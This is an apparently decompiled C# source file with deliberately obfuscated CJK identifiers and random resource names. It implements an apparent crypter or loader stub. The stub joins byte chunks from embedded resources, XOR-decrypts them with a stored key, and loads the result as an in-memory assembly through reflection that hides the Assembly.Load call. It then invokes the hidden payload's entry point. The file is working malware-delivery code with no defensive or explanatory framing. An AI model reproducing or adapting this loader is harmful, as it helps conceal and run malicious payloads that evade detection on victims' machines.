using System;
using System.Collections.Generic;
using System.Reflection;
using System.Resources;
using System.Threading;
using System.Windows.Forms;

namespace 乍万乲乃乞;

internal class 个乃丒丢丐
{
	private static Assembly 丿丯乗七一()
	{
		Type type_ = 个乃丒丢丐.smethod_0(typeof(Assembly).TypeHandle);
		MethodInfo[] array = 个乃丒丢丐.smethod_1(type_);
		MethodInfo[] array2 = array;
		foreach (MethodInfo methodInfo in array2)
		{
			if (个乃丒丢丐.smethod_3(个乃丒丢丐.smethod_2((MemberInfo)methodInfo), "GetExecutingAssembly"))
			{
				try
				{
					return (Assembly)个乃丒丢丐.smethod_4((MethodBase)methodInfo, (object)null, (object[])null);
				}
				catch
				{
				}
			}
		}
		return null;
	}

	private static MethodInfo 丩丗乿乐乖(Assembly 举丆专乾义)
	{
		Type type_ = 个乃丒丢丐.smethod_0(typeof(Assembly).TypeHandle);
		PropertyInfo[] array = 个乃丒丢丐.smethod_5(type_);
		PropertyInfo[] array2 = array;
		int num = 0;
		PropertyInfo propertyInfo;
		while (true)
		{
			if (num < array2.Length)
			{
				propertyInfo = array2[num];
				if (个乃丒丢丐.smethod_3(个乃丒丢丐.smethod_2((MemberInfo)propertyInfo), "EntryPoint"))
				{
					break;
				}
				num++;
				continue;
			}
			return null;
		}
		return (MethodInfo)个乃丒丢丐.smethod_6(propertyInfo, (object)举丆专乾义, (object[])null);
	}

	private static void 义丫丶丿万(string[] args)
	{
		//IL_0105: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Thread.Sleep(2);
			List<byte> list = new List<byte>();
			ResourceManager resourceManager = new ResourceManager("rM7A98Qxqc2cb2ujaUrJ", 丿丯乗七一());
			string[] array = (string[])resourceManager.GetObject("tY3PKRm9l8SG0s312WWdNNgEDv6");
			byte[] 习丨业丶丈 = (byte[])resourceManager.GetObject("idEvvJw8aHS2qIkcmUak");
			_ = (byte[])resourceManager.GetObject("k1ulDBEkKjDPw6DZgFlnc0HkRbxM4Xq3mfMx");
			string[] array2 = array;
			foreach (string name in array2)
			{
				byte[] array3 = (byte[])resourceManager.GetObject(name);
				for (int j = 0; j < array3.Length; j++)
				{
					list.Add(array3[j]);
				}
			}
			byte[] array4 = new byte[list.Count];
			for (int k = 0; k < array4.Length; k++)
			{
				array4[k] = list[k];
			}
			array4 = 书丼临书乒(array4, 习丨业丶丈);
			Assembly 举丆专乾义 = 习也丳丒乔(array4);
			MethodInfo methodInfo = 丩丗乿乐乖(举丆专乾义);
			methodInfo.Invoke(null, new object[1] { args });
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private static byte[] 书丼临书乒(byte[] 乕乶乖乓乳, byte[] 习丨业丶丈)
	{
		for (int i = 0; i < 乕乶乖乓乳.Length; i++)
		{
			for (int j = 0; j < 习丨业丶丈.Length; j++)
			{
				乕乶乖乓乳[i] = (byte)(乕乶乖乓乳[i] ^ 习丨业丶丈[j]);
			}
		}
		return 乕乶乖乓乳;
	}

	private static void 义乀丫上丵()
	{
	}

	private static Assembly 习也丳丒乔(byte[] 丌乻乶乗主)
	{
		Type type_ = 个乃丒丢丐.smethod_0(typeof(Assembly).TypeHandle);
		MethodInfo[] array = 个乃丒丢丐.smethod_1(type_);
		MethodInfo[] array2 = array;
		foreach (MethodInfo methodInfo in array2)
		{
			if (个乃丒丢丐.smethod_3(个乃丒丢丐.smethod_2((MemberInfo)methodInfo), "Load"))
			{
				try
				{
					return (Assembly)个乃丒丢丐.smethod_4((MethodBase)methodInfo, (object)null, new object[1] { 丌乻乶乗主 });
				}
				catch
				{
				}
			}
		}
		return null;
	}

	static Type smethod_0(RuntimeTypeHandle runtimeTypeHandle_0)
	{
		return Type.GetTypeFromHandle(runtimeTypeHandle_0);
	}

	static MethodInfo[] smethod_1(Type type_0)
	{
		return type_0.GetMethods();
	}

	static string smethod_2(MemberInfo memberInfo_0)
	{
		return memberInfo_0.Name;
	}

	static bool smethod_3(string string_0, string string_1)
	{
		return string_0 == string_1;
	}

	static object smethod_4(MethodBase methodBase_0, object object_0, object[] object_1)
	{
		return methodBase_0.Invoke(object_0, object_1);
	}

	static PropertyInfo[] smethod_5(Type type_0)
	{
		return type_0.GetProperties();
	}

	static object smethod_6(PropertyInfo propertyInfo_0, object object_0, object[] object_1)
	{
		return propertyInfo_0.GetValue(object_0, object_1);
	}
}
